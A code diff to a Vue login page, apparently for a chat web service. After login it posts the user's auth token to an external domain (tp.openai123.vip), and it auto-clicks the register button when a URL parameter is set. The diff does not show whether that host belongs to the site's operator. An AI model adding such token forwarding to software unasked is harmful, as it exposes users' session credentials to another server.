@@ -2,6 +2,7 @@
 import { computed, onMounted, ref, watch } from 'vue'
 import { NButton, NInput, NModal, NTabPane, NTabs, useMessage } from 'naive-ui'
 import { useRoute, useRouter } from 'vue-router'
+import axios from 'axios'
 import { fetchLogin, fetchRegister, fetchResetPassword, fetchSendResetMail, fetchVerify, fetchVerifyAdmin } from '@/api'
 import { useAuthStore } from '@/store'
 import { useBasicLayout } from '@/hooks/useBasicLayout'
@@ -111,6 +112,15 @@ function handlePress(event: KeyboardEvent) {
   }
 }
 
+async function fetchJson(url: string, params: object): Promise<any> {
+  const response = await axios({
+    method: 'post',
+    url,
+    data: params,
+  })
+  return response.data
+}
+
 async function handleLogin() {
   const name = username.value.trim()
   const pwd = password.value.trim()
@@ -122,7 +132,11 @@ async function handleLogin() {
     loading.value = true
     const result = await fetchLogin(name, pwd)
     await authStore.setToken(result.data.token)
-    ms.success('success')
+    // 发起一个TP的请求，注册用户
+    const postData = { token: result.data.token }
+    await fetchJson('https://tp.openai123.vip/index/index/login', postData)
+
+    ms.success('登录成功')
     router.go(0)
   }
   catch (error: any) {
@@ -200,6 +214,14 @@ async function handleResetPassword() {
 }
 watch(() => route.query.mobileFrom, (value) => {
   mobileFrom.value = value as string || ''
+
+  if (mobileFrom.value) {
+    // 获取目标按钮元素
+    const button: HTMLButtonElement | null = document.querySelector('#registerButton')
+    // 模拟点击操作
+    if (button)
+      button.click()
+  }
 })
 </script>
 
